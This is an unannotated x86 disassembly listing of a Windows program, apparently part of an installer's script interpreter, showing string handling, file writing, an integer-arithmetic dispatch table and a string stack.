  4016d4:	85 c0                	test   %eax,%eax
  4016d6:	74 23                	je     0x4016fb
  4016d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4016db:	3b c6                	cmp    %esi,%eax
  4016dd:	76 25                	jbe    0x401704
  4016df:	38 18                	cmp    %bl,(%eax)
  4016e1:	74 21                	je     0x401704
  4016e3:	56                   	push   %esi
  4016e4:	e8 5b 4d 00 00       	call   0x406444
  4016e9:	3b c3                	cmp    %ebx,%eax
  4016eb:	74 0e                	je     0x4016fb
  4016ed:	83 c0 2c             	add    $0x2c,%eax
  4016f0:	50                   	push   %eax
  4016f1:	ff 75 08             	push   0x8(%ebp)
  4016f4:	e8 48 4a 00 00       	call   0x406141
  4016f9:	eb 09                	jmp    0x401704
  4016fb:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401702:	88 1f                	mov    %bl,(%edi)
  401704:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401707:	0f 85 ab 12 00 00    	jne    0x4029b8
  40170d:	68 00 04 00 00       	push   $0x400
  401712:	57                   	push   %edi
  401713:	57                   	push   %edi
  401714:	ff 15 0c 81 40 00    	call   *0x40810c
  40171a:	e9 99 12 00 00       	jmp    0x4029b8
  40171f:	6a ff                	push   $0xffffffff
  401721:	e8 06 14 00 00       	call   0x402b2c
  401726:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401729:	51                   	push   %ecx
  40172a:	56                   	push   %esi
  40172b:	68 00 04 00 00       	push   $0x400
  401730:	53                   	push   %ebx
  401731:	50                   	push   %eax
  401732:	53                   	push   %ebx
  401733:	ff 15 10 81 40 00    	call   *0x408110
  401739:	85 c0                	test   %eax,%eax
  40173b:	0f 85 77 12 00 00    	jne    0x4029b8
  401741:	e9 11 10 00 00       	jmp    0x402757
  401746:	6a ef                	push   $0xffffffef
  401748:	e8 df 13 00 00       	call   0x402b2c
  40174d:	50                   	push   %eax
  40174e:	56                   	push   %esi
  40174f:	e8 b5 45 00 00       	call   0x405d09
  401754:	e9 55 fe ff ff       	jmp    0x4015ae
  401759:	6a 31                	push   $0x31
  40175b:	e8 cc 13 00 00       	call   0x402b2c
  401760:	8b f0                	mov    %eax,%esi
  401762:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401765:	83 e0 07             	and    $0x7,%eax
  401768:	56                   	push   %esi
  401769:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40176c:	89 45 08             	mov    %eax,0x8(%ebp)
  40176f:	e8 d2 43 00 00       	call   0x405b46
  401774:	56                   	push   %esi
  401775:	be 00 a4 40 00       	mov    $0x40a400,%esi
  40177a:	85 c0                	test   %eax,%eax
  40177c:	74 08                	je     0x401786
  40177e:	56                   	push   %esi
  40177f:	e8 bd 49 00 00       	call   0x406141
  401784:	eb 17                	jmp    0x40179d
  401786:	68 00 a8 42 00       	push   $0x42a800
  40178b:	56                   	push   %esi
  40178c:	e8 b0 49 00 00       	call   0x406141
  401791:	50                   	push   %eax
  401792:	e8 42 43 00 00       	call   0x405ad9
  401797:	50                   	push   %eax
  401798:	e8 c0 49 00 00       	call   0x40615d
  40179d:	56                   	push   %esi
  40179e:	e8 08 4c 00 00       	call   0x4063ab
  4017a3:	bf 00 ac 40 00       	mov    $0x40ac00,%edi
  4017a8:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4017ac:	7c 31                	jl     0x4017df
  4017ae:	56                   	push   %esi
  4017af:	e8 90 4c 00 00       	call   0x406444
  4017b4:	33 c9                	xor    %ecx,%ecx
  4017b6:	3b c3                	cmp    %ebx,%eax
  4017b8:	74 10                	je     0x4017ca
  4017ba:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4017bd:	83 c0 14             	add    $0x14,%eax
  4017c0:	51                   	push   %ecx
  4017c1:	50                   	push   %eax
  4017c2:	ff 15 f4 80 40 00    	call   *0x4080f4
  4017c8:	8b c8                	mov    %eax,%ecx
  4017ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4017cd:	83 c0 fd             	add    $0xfffffffd,%eax
  4017d0:	0d 00 00 00 80       	or     $0x80000000,%eax
  4017d5:	23 c1                	and    %ecx,%eax
  4017d7:	f7 d8                	neg    %eax
  4017d9:	1b c0                	sbb    %eax,%eax
  4017db:	40                   	inc    %eax
  4017dc:	89 45 08             	mov    %eax,0x8(%ebp)
  4017df:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4017e2:	75 06                	jne    0x4017ea
  4017e4:	56                   	push   %esi
  4017e5:	e8 cb 44 00 00       	call   0x405cb5
  4017ea:	33 c0                	xor    %eax,%eax
  4017ec:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  4017f0:	0f 95 c0             	setne  %al
  4017f3:	40                   	inc    %eax
  4017f4:	50                   	push   %eax
  4017f5:	68 00 00 00 40       	push   $0x40000000
  4017fa:	56                   	push   %esi
  4017fb:	e8 da 44 00 00       	call   0x405cda
  401800:	83 f8 ff             	cmp    $0xffffffff,%eax
  401803:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401806:	75 76                	jne    0x40187e
  401808:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40180b:	75 53                	jne    0x401860
  40180d:	68 00 50 42 00       	push   $0x425000
  401812:	57                   	push   %edi
  401813:	e8 29 49 00 00       	call   0x406141
  401818:	56                   	push   %esi
  401819:	68 00 50 42 00       	push   $0x425000
  40181e:	e8 1e 49 00 00       	call   0x406141
  401823:	ff 75 e0             	push   -0x20(%ebp)
  401826:	68 00 a8 40 00       	push   $0x40a800
  40182b:	e8 33 49 00 00       	call   0x406163
  401830:	57                   	push   %edi
  401831:	68 00 50 42 00       	push   $0x425000
  401836:	e8 06 49 00 00       	call   0x406141
  40183b:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40183e:	c1 f8 03             	sar    $0x3,%eax
  401841:	50                   	push   %eax
  401842:	68 00 a8 40 00       	push   $0x40a800
  401847:	e8 11 40 00 00       	call   0x40585d
  40184c:	83 e8 04             	sub    $0x4,%eax
  40184f:	0f 84 53 ff ff ff    	je     0x4017a8
  401855:	48                   	dec    %eax
  401856:	74 1b                	je     0x401873
  401858:	56                   	push   %esi
  401859:	6a fa                	push   $0xfffffffa
  40185b:	e9 32 fc ff ff       	jmp    0x401492
  401860:	ff 75 f8             	push   -0x8(%ebp)
  401863:	6a e2                	push   $0xffffffe2
  401865:	e8 fe 39 00 00       	call   0x405268
  40186a:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40186e:	e9 3d fd ff ff       	jmp    0x4015b0
  401873:	ff 05 c8 47 42 00    	incl   0x4247c8
  401879:	e9 43 11 00 00       	jmp    0x4029c1
  40187e:	ff 75 f8             	push   -0x8(%ebp)
  401881:	6a ea                	push   $0xffffffea
  401883:	e8 e0 39 00 00       	call   0x405268
  401888:	ff 05 f4 47 42 00    	incl   0x4247f4
  40188e:	53                   	push   %ebx
  40188f:	53                   	push   %ebx
  401890:	ff 75 f4             	push   -0xc(%ebp)
  401893:	ff 75 d4             	push   -0x2c(%ebp)
  401896:	e8 1a 18 00 00       	call   0x4030b5
  40189b:	ff 0d f4 47 42 00    	decl   0x4247f4
  4018a1:	83 7d d8 ff          	cmpl   $0xffffffff,-0x28(%ebp)
  4018a5:	8b f8                	mov    %eax,%edi
  4018a7:	75 06                	jne    0x4018af
  4018a9:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%ebp)
  4018ad:	74 12                	je     0x4018c1
  4018af:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4018b2:	50                   	push   %eax
  4018b3:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4018b6:	53                   	push   %ebx
  4018b7:	50                   	push   %eax
  4018b8:	ff 75 f4             	push   -0xc(%ebp)
  4018bb:	ff 15 f8 80 40 00    	call   *0x4080f8
  4018c1:	ff 75 f4             	push   -0xc(%ebp)
  4018c4:	ff 15 14 81 40 00    	call   *0x408114
  4018ca:	3b fb                	cmp    %ebx,%edi
  4018cc:	0f 8d e6 10 00 00    	jge    0x4029b8
  4018d2:	83 ff fe             	cmp    $0xfffffffe,%edi
  4018d5:	75 13                	jne    0x4018ea
  4018d7:	6a e9                	push   $0xffffffe9
  4018d9:	56                   	push   %esi
  4018da:	e8 84 48 00 00       	call   0x406163
  4018df:	ff 75 f8             	push   -0x8(%ebp)
  4018e2:	56                   	push   %esi
  4018e3:	e8 75 48 00 00       	call   0x40615d
  4018e8:	eb 08                	jmp    0x4018f2
  4018ea:	6a ee                	push   $0xffffffee
  4018ec:	56                   	push   %esi
  4018ed:	e8 71 48 00 00       	call   0x406163
  4018f2:	68 10 00 20 00       	push   $0x200010
  4018f7:	56                   	push   %esi
  4018f8:	e9 4c 0a 00 00       	jmp    0x402349
  4018fd:	53                   	push   %ebx
  4018fe:	eb 34                	jmp    0x401934
  401900:	6a 31                	push   $0x31
  401902:	e8 25 12 00 00       	call   0x402b2c
  401907:	ff 75 cc             	push   -0x34(%ebp)
  40190a:	50                   	push   %eax
  40190b:	e8 4d 3f 00 00       	call   0x40585d
  401910:	3b c3                	cmp    %ebx,%eax
  401912:	0f 84 6b 0e 00 00    	je     0x402783
  401918:	3b 45 d4             	cmp    -0x2c(%ebp),%eax
  40191b:	0f 84 67 01 00 00    	je     0x401a88
  401921:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  401924:	0f 85 8e 10 00 00    	jne    0x4029b8
  40192a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40192d:	e9 91 10 00 00       	jmp    0x4029c3
  401932:	6a f0                	push   $0xfffffff0
  401934:	e8 f3 11 00 00       	call   0x402b2c
  401939:	ff 75 d0             	push   -0x30(%ebp)
  40193c:	50                   	push   %eax
  40193d:	e8 c7 3f 00 00       	call   0x405909
  401942:	e9 71 10 00 00       	jmp    0x4029b8
  401947:	6a 01                	push   $0x1
  401949:	e8 de 11 00 00       	call   0x402b2c
  40194e:	50                   	push   %eax
  40194f:	e8 03 48 00 00       	call   0x406157
  401954:	e9 8b 0c 00 00       	jmp    0x4025e4
  401959:	6a 02                	push   $0x2
  40195b:	e8 aa 11 00 00       	call   0x402b0a
  401960:	6a 03                	push   $0x3
  401962:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401965:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401968:	e8 9d 11 00 00       	call   0x402b0a
  40196d:	59                   	pop    %ecx
  40196e:	8b f8                	mov    %eax,%edi
  401970:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401973:	59                   	pop    %ecx
  401974:	6a 01                	push   $0x1
  401976:	89 7d b0             	mov    %edi,-0x50(%ebp)
  401979:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  40197c:	89 45 08             	mov    %eax,0x8(%ebp)
  40197f:	e8 a8 11 00 00       	call   0x402b2c
  401984:	50                   	push   %eax
  401985:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401988:	e8 ca 47 00 00       	call   0x406157
  40198d:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  401990:	88 1e                	mov    %bl,(%esi)
  401992:	75 03                	jne    0x401997
  401994:	89 45 08             	mov    %eax,0x8(%ebp)
  401997:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40199a:	0f 84 18 10 00 00    	je     0x4029b8
  4019a0:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4019a3:	3b cb                	cmp    %ebx,%ecx
  4019a5:	7d 0b                	jge    0x4019b2
  4019a7:	8d 3c 08             	lea    (%eax,%ecx,1),%edi
  4019aa:	3b fb                	cmp    %ebx,%edi
  4019ac:	0f 8c 06 10 00 00    	jl     0x4029b8
  4019b2:	3b f8                	cmp    %eax,%edi
  4019b4:	7e 02                	jle    0x4019b8
  4019b6:	8b f8                	mov    %eax,%edi
  4019b8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4019bb:	03 c7                	add    %edi,%eax
  4019bd:	50                   	push   %eax
  4019be:	56                   	push   %esi
  4019bf:	e8 7d 47 00 00       	call   0x406141
  4019c4:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4019c7:	7d 0e                	jge    0x4019d7
  4019c9:	56                   	push   %esi
  4019ca:	e8 88 47 00 00       	call   0x406157
  4019cf:	01 45 08             	add    %eax,0x8(%ebp)
  4019d2:	79 03                	jns    0x4019d7
  4019d4:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4019d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4019da:	3d 00 04 00 00       	cmp    $0x400,%eax
  4019df:	0f 8d d3 0f 00 00    	jge    0x4029b8
  4019e5:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  4019e8:	e9 cb 0f 00 00       	jmp    0x4029b8
  4019ed:	6a 20                	push   $0x20
  4019ef:	e8 38 11 00 00       	call   0x402b2c
  4019f4:	6a 31                	push   $0x31
  4019f6:	8b f0                	mov    %eax,%esi
  4019f8:	e8 2f 11 00 00       	call   0x402b2c
  4019fd:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401a00:	50                   	push   %eax
  401a01:	56                   	push   %esi
  401a02:	75 12                	jne    0x401a16
  401a04:	ff 15 18 81 40 00    	call   *0x408118
  401a0a:	85 c0                	test   %eax,%eax
  401a0c:	75 7a                	jne    0x401a88
  401a0e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401a11:	e9 ad 0f 00 00       	jmp    0x4029c3
  401a16:	ff 15 24 81 40 00    	call   *0x408124
  401a1c:	eb ec                	jmp    0x401a0a
  401a1e:	33 ff                	xor    %edi,%edi
  401a20:	47                   	inc    %edi
  401a21:	57                   	push   %edi
  401a22:	e8 05 11 00 00       	call   0x402b2c
  401a27:	68 00 04 00 00       	push   $0x400
  401a2c:	56                   	push   %esi
  401a2d:	50                   	push   %eax
  401a2e:	89 45 08             	mov    %eax,0x8(%ebp)
  401a31:	ff 15 60 81 40 00    	call   *0x408160
  401a37:	85 c0                	test   %eax,%eax
  401a39:	74 13                	je     0x401a4e
  401a3b:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401a3e:	74 13                	je     0x401a53
  401a40:	56                   	push   %esi
  401a41:	ff 75 08             	push   0x8(%ebp)
  401a44:	ff 15 24 81 40 00    	call   *0x408124
  401a4a:	85 c0                	test   %eax,%eax
  401a4c:	75 05                	jne    0x401a53
  401a4e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401a51:	88 1e                	mov    %bl,(%esi)
  401a53:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  401a59:	e9 5a 0f 00 00       	jmp    0x4029b8
  401a5e:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401a61:	53                   	push   %ebx
  401a62:	e8 a3 10 00 00       	call   0x402b0a
  401a67:	6a 01                	push   $0x1
  401a69:	8b f8                	mov    %eax,%edi
  401a6b:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a6e:	e8 97 10 00 00       	call   0x402b0a
  401a73:	59                   	pop    %ecx
  401a74:	3b f3                	cmp    %ebx,%esi
  401a76:	59                   	pop    %ecx
  401a77:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401a7a:	75 08                	jne    0x401a84
  401a7c:	3b f8                	cmp    %eax,%edi
  401a7e:	7c 08                	jl     0x401a88
  401a80:	7e 8c                	jle    0x401a0e
  401a82:	eb 12                	jmp    0x401a96
  401a84:	3b f8                	cmp    %eax,%edi
  401a86:	73 08                	jae    0x401a90
  401a88:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401a8b:	e9 33 0f 00 00       	jmp    0x4029c3
  401a90:	0f 86 78 ff ff ff    	jbe    0x401a0e
  401a96:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a99:	e9 25 0f 00 00       	jmp    0x4029c3
  401a9e:	6a 01                	push   $0x1
  401aa0:	e8 65 10 00 00       	call   0x402b0a
  401aa5:	8b f8                	mov    %eax,%edi
  401aa7:	6a 02                	push   $0x2
  401aa9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401aac:	89 7d 08             	mov    %edi,0x8(%ebp)
  401aaf:	e8 56 10 00 00       	call   0x402b0a
  401ab4:	59                   	pop    %ecx
  401ab5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ab8:	59                   	pop    %ecx
  401ab9:	8b c8                	mov    %eax,%ecx
  401abb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401abe:	83 f8 0d             	cmp    $0xd,%eax
  401ac1:	77 73                	ja     0x401b36
  401ac3:	ff 24 85 d2 2a 40 00 	jmp    *0x402ad2(,%eax,4)
  401aca:	03 f9                	add    %ecx,%edi
  401acc:	eb 6b                	jmp    0x401b39
  401ace:	2b f9                	sub    %ecx,%edi
  401ad0:	eb 67                	jmp    0x401b39
  401ad2:	0f af cf             	imul   %edi,%ecx
  401ad5:	eb 17                	jmp    0x401aee
  401ad7:	3b cb                	cmp    %ebx,%ecx
  401ad9:	74 44                	je     0x401b1f
  401adb:	8b c7                	mov    %edi,%eax
  401add:	99                   	cltd
  401ade:	f7 f9                	idiv   %ecx
  401ae0:	8b f8                	mov    %eax,%edi
  401ae2:	eb 55                	jmp    0x401b39
  401ae4:	0b cf                	or     %edi,%ecx
  401ae6:	eb 06                	jmp    0x401aee
  401ae8:	23 cf                	and    %edi,%ecx
  401aea:	eb 02                	jmp    0x401aee
  401aec:	33 cf                	xor    %edi,%ecx
  401aee:	8b f9                	mov    %ecx,%edi
  401af0:	eb 47                	jmp    0x401b39
  401af2:	33 c0                	xor    %eax,%eax
  401af4:	3b fb                	cmp    %ebx,%edi
  401af6:	0f 94 c0             	sete   %al
  401af9:	eb e5                	jmp    0x401ae0
  401afb:	3b fb                	cmp    %ebx,%edi
  401afd:	75 0e                	jne    0x401b0d
  401aff:	eb 08                	jmp    0x401b09
  401b01:	33 ff                	xor    %edi,%edi
  401b03:	eb 34                	jmp    0x401b39
  401b05:	3b fb                	cmp    %ebx,%edi
  401b07:	74 f8                	je     0x401b01
  401b09:	3b cb                	cmp    %ebx,%ecx
  401b0b:	74 f4                	je     0x401b01
  401b0d:	33 ff                	xor    %edi,%edi
  401b0f:	47                   	inc    %edi
  401b10:	eb 27                	jmp    0x401b39
  401b12:	3b cb                	cmp    %ebx,%ecx
  401b14:	74 09                	je     0x401b1f
  401b16:	8b c7                	mov    %edi,%eax
  401b18:	99                   	cltd
  401b19:	f7 f9                	idiv   %ecx
  401b1b:	8b fa                	mov    %edx,%edi
  401b1d:	eb 1a                	jmp    0x401b39
  401b1f:	33 ff                	xor    %edi,%edi
  401b21:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401b28:	eb 0f                	jmp    0x401b39
  401b2a:	d3 e7                	shl    %cl,%edi
  401b2c:	eb 0b                	jmp    0x401b39
  401b2e:	d3 ff                	sar    %cl,%edi
  401b30:	eb 07                	jmp    0x401b39
  401b32:	d3 ef                	shr    %cl,%edi
  401b34:	eb 03                	jmp    0x401b39
  401b36:	8b 7d 08             	mov    0x8(%ebp),%edi
  401b39:	57                   	push   %edi
  401b3a:	e9 2a fa ff ff       	jmp    0x401569
  401b3f:	6a 01                	push   $0x1
  401b41:	e8 e6 0f 00 00       	call   0x402b2c
  401b46:	6a 02                	push   $0x2
  401b48:	8b f8                	mov    %eax,%edi
  401b4a:	e8 bb 0f 00 00       	call   0x402b0a
  401b4f:	50                   	push   %eax
  401b50:	57                   	push   %edi
  401b51:	56                   	push   %esi
  401b52:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401b55:	ff 15 74 82 40 00    	call   *0x408274
  401b5b:	83 c4 10             	add    $0x10,%esp
  401b5e:	e9 55 0e 00 00       	jmp    0x4029b8
  401b63:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401b66:	8b 3d 40 b8 40 00    	mov    0x40b840,%edi
  401b6c:	3b c3                	cmp    %ebx,%eax
  401b6e:	74 44                	je     0x401bb4
  401b70:	48                   	dec    %eax
  401b71:	3b fb                	cmp    %ebx,%edi
  401b73:	0f 84 c2 07 00 00    	je     0x40233b
  401b79:	8b 3f                	mov    (%edi),%edi
  401b7b:	3b c3                	cmp    %ebx,%eax
  401b7d:	75 f1                	jne    0x401b70
  401b7f:	3b fb                	cmp    %ebx,%edi
  401b81:	0f 84 b4 07 00 00    	je     0x40233b
  401b87:	83 c7 04             	add    $0x4,%edi
  401b8a:	be 00 a4 40 00       	mov    $0x40a400,%esi
  401b8f:	57                   	push   %edi
  401b90:	56                   	push   %esi
  401b91:	e8 ab 45 00 00       	call   0x406141
  401b96:	a1 40 b8 40 00       	mov    0x40b840,%eax
  401b9b:	83 c0 04             	add    $0x4,%eax
  401b9e:	50                   	push   %eax
  401b9f:	57                   	push   %edi
  401ba0:	e8 9c 45 00 00       	call   0x406141
  401ba5:	a1 40 b8 40 00       	mov    0x40b840,%eax
  401baa:	56                   	push   %esi
  401bab:	83 c0 04             	add    $0x4,%eax
  401bae:	50                   	push   %eax
  401baf:	e9 22 0d 00 00       	jmp    0x4028d6
  401bb4:	3b d3                	cmp    %ebx,%edx
  401bb6:	74 25                	je     0x401bdd
  401bb8:	3b fb                	cmp    %ebx,%edi
  401bba:	0f 84 c3 0b 00 00    	je     0x402783
  401bc0:	8d 47 04             	lea    0x4(%edi),%eax
  401bc3:	50                   	push   %eax
  401bc4:	56                   	push   %esi
  401bc5:	e8 77 45 00 00       	call   0x406141
  401bca:	8b 07                	mov    (%edi),%eax
  401bcc:	57                   	push   %edi
  401bcd:	a3 40 b8 40 00       	mov    %eax,0x40b840
  401bd2:	ff 15 5c 81 40 00    	call   *0x40815c
  401bd8:	e9 db 0d 00 00       	jmp    0x4029b8
  401bdd:	68 04 04 00 00       	push   $0x404
  401be2:	6a 40                	push   $0x40
  401be4:	ff 15 58 81 40 00    	call   *0x408158
  401bea:	ff 75 cc             	push   -0x34(%ebp)
  401bed:	8b f0                	mov    %eax,%esi
  401bef:	8d 46 04             	lea    0x4(%esi),%eax
  401bf2:	50                   	push   %eax
  401bf3:	e8 6b 45 00 00       	call   0x406163
  401bf8:	a1 40 b8 40 00       	mov    0x40b840,%eax
  401bfd:	89 06                	mov    %eax,(%esi)
  401bff:	89 35 40 b8 40 00    	mov    %esi,0x40b840
  401c05:	e9 ae 0d 00 00       	jmp    0x4029b8
  401c0a:	6a 03                	push   $0x3
  401c0c:	e8 f9 0e 00 00       	call   0x402b0a
  401c11:	6a 04                	push   $0x4
  401c13:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c16:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c19:	e8 ec 0e 00 00       	call   0x402b0a
  401c1e:	f6 45 e0 01          	testb  $0x1,-0x20(%ebp)
  401c22:	59                   	pop    %ecx
  401c23:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c26:	59                   	pop    %ecx
  401c27:	89 45 08             	mov    %eax,0x8(%ebp)
  401c2a:	74 0a                	je     0x401c36
  401c2c:	6a 33                	push   $0x33
  401c2e:	e8 f9 0e 00 00       	call   0x402b2c
  401c33:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c36:	f6 45 e0 02          	testb  $0x2,-0x20(%ebp)
  401c3a:	74 0a                	je     0x401c46
  401c3c:	6a 44                	push   $0x44
  401c3e:	e8 e9 0e 00 00       	call   0x402b2c
  401c43:	89 45 08             	mov    %eax,0x8(%ebp)
  401c46:	83 7d c8 21          	cmpl   $0x21,-0x38(%ebp)
  401c4a:	6a 01                	push   $0x1
  401c4c:	75 4c                	jne    0x401c9a
  401c4e:	e8 b7 0e 00 00       	call   0x402b0a
  401c53:	6a 02                	push   $0x2
  401c55:	8b f8                	mov    %eax,%edi
  401c57:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c5a:	e8 ab 0e 00 00       	call   0x402b0a
  401c5f:	59                   	pop    %ecx
  401c60:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401c63:	59                   	pop    %ecx
  401c64:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401c67:	c1 f9 02             	sar    $0x2,%ecx
  401c6a:	74 1e                	je     0x401c8a
  401c6c:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401c6f:	52                   	push   %edx
  401c70:	51                   	push   %ecx
  401c71:	53                   	push   %ebx
  401c72:	ff 75 08             	push   0x8(%ebp)
  401c75:	ff 75 f8             	push   -0x8(%ebp)
  401c78:	50                   	push   %eax
  401c79:	57                   	push   %edi
  401c7a:	ff 15 50 82 40 00    	call   *0x408250
  401c80:	f7 d8                	neg    %eax
  401c82:	1b c0                	sbb    %eax,%eax
  401c84:	40                   	inc    %eax
  401c85:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c88:	eb 3f                	jmp    0x401cc9
  401c8a:	ff 75 08             	push   0x8(%ebp)
  401c8d:	ff 75 f8             	push   -0x8(%ebp)
  401c90:	50                   	push   %eax
  401c91:	57                   	push   %edi
  401c92:	ff 15 00 82 40 00    	call   *0x408200
  401c98:	eb 2c                	jmp    0x401cc6
  401c9a:	e8 8d 0e 00 00       	call   0x402b2c
  401c9f:	6a 12                	push   $0x12
  401ca1:	8b f8                	mov    %eax,%edi
  401ca3:	e8 84 0e 00 00       	call   0x402b2c
  401ca8:	8a 08                	mov    (%eax),%cl
  401caa:	f6 d9                	neg    %cl
  401cac:	1b c9                	sbb    %ecx,%ecx
  401cae:	23 c8                	and    %eax,%ecx
  401cb0:	8a 07                	mov    (%edi),%al
  401cb2:	f6 d8                	neg    %al
  401cb4:	1b c0                	sbb    %eax,%eax
  401cb6:	51                   	push   %ecx
  401cb7:	23 c7                	and    %edi,%eax
  401cb9:	50                   	push   %eax
  401cba:	ff 75 08             	push   0x8(%ebp)
  401cbd:	ff 75 f8             	push   -0x8(%ebp)
  401cc0:	ff 15 54 82 40 00    	call   *0x408254
  401cc6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401cc9:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
  401ccc:	0f 8c e6 0c 00 00    	jl     0x4029b8
  401cd2:	ff 75 f4             	push   -0xc(%ebp)
  401cd5:	e9 8f f8 ff ff       	jmp    0x401569
  401cda:	53                   	push   %ebx
  401cdb:	e8 2a 0e 00 00       	call   0x402b0a
  401ce0:	59                   	pop    %ecx
  401ce1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ce4:	50                   	push   %eax
  401ce5:	ff 15 58 82 40 00    	call   *0x408258
  401ceb:	85 c0                	test   %eax,%eax
  401ced:	0f 84 1b fd ff ff    	je     0x401a0e
  401cf3:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401cf6:	e9 c8 0c 00 00       	jmp    0x4029c3
  401cfb:	6a 02                	push   $0x2
  401cfd:	e8 08 0e 00 00       	call   0x402b0a
  401d02:	6a 01                	push   $0x1
  401d04:	8b f8                	mov    %eax,%edi
  401d06:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d09:	e8 fc 0d 00 00       	call   0x402b0a
  401d0e:	59                   	pop    %ecx
  401d0f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d12:	59                   	pop    %ecx
  401d13:	57                   	push   %edi
  401d14:	50                   	push   %eax
  401d15:	ff 15 d0 81 40 00    	call   *0x4081d0
  401d1b:	e9 c4 08 00 00       	jmp    0x4025e4
  401d20:	a1 88 47 42 00       	mov    0x424788,%eax
  401d25:	53                   	push   %ebx
  401d26:	8d 34 10             	lea    (%eax,%edx,1),%esi
  401d29:	e8 dc 0d 00 00       	call   0x402b0a
  401d2e:	59                   	pop    %ecx
  401d2f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d32:	56                   	push   %esi
  401d33:	6a eb                	push   $0xffffffeb
  401d35:	50                   	push   %eax
  401d36:	ff 15 4c 82 40 00    	call   *0x40824c
  401d3c:	e9 77 0c 00 00       	jmp    0x4029b8
  401d41:	f6 45 d5 01          	testb  $0x1,-0x2b(%ebp)
  401d45:	74 0d                	je     0x401d54
  401d47:	6a 01                	push   $0x1
  401d49:	e8 bc 0d 00 00       	call   0x402b0a
  401d4e:	59                   	pop    %ecx
  401d4f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401d52:	eb 0a                	jmp    0x401d5e
  401d54:	52                   	push   %edx
  401d55:	ff 75 f8             	push   -0x8(%ebp)
  401d58:	ff 15 d0 81 40 00    	call   *0x4081d0
  401d5e:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401d61:	89 45 08             	mov    %eax,0x8(%ebp)
  401d64:	8b c1                	mov    %ecx,%eax
  401d66:	8b f9                	mov    %ecx,%edi
  401d68:	c1 e8 1f             	shr    $0x1f,%eax
  401d6b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401d6e:	8b c1                	mov    %ecx,%eax
  401d70:	8b f1                	mov    %ecx,%esi
  401d72:	83 e7 03             	and    $0x3,%edi
  401d75:	c1 e8 1e             	shr    $0x1e,%eax
  401d78:	83 e6 04             	and    $0x4,%esi
  401d7b:	83 e0 01             	and    $0x1,%eax
  401d7e:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401d84:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401d87:	74 08                	je     0x401d91
  401d89:	53                   	push   %ebx
  401d8a:	e8 9d 0d 00 00       	call   0x402b2c
  401d8f:	eb 04                	jmp    0x401d95
  401d91:	0f b7 45 cc          	movzwl -0x34(%ebp),%eax
  401d95:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401d98:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401d9b:	50                   	push   %eax
  401d9c:	ff 75 08             	push   0x8(%ebp)
  401d9f:	ff 15 0c 82 40 00    	call   *0x40820c
  401da5:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401da8:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401dad:	50                   	push   %eax
